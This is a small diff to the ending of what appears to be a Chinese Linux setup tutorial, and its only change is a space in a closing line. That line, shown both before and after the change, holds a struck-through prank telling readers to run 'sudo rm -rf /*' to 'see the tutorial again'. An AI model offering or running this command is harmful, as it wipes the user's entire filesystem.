@@ -360,7 +360,6 @@ $ reboot
 #重启
 ```
 
-# END~~（想再看一遍本教程吗？那就请在终端中输入sudo rm -rf /*，你会回来的。）~~
-
+# END ~~（想再看一遍本教程吗？那就请在终端中输入sudo rm -rf /*，你会回来的。）~~
 # By MicrosoftXiaoice
 
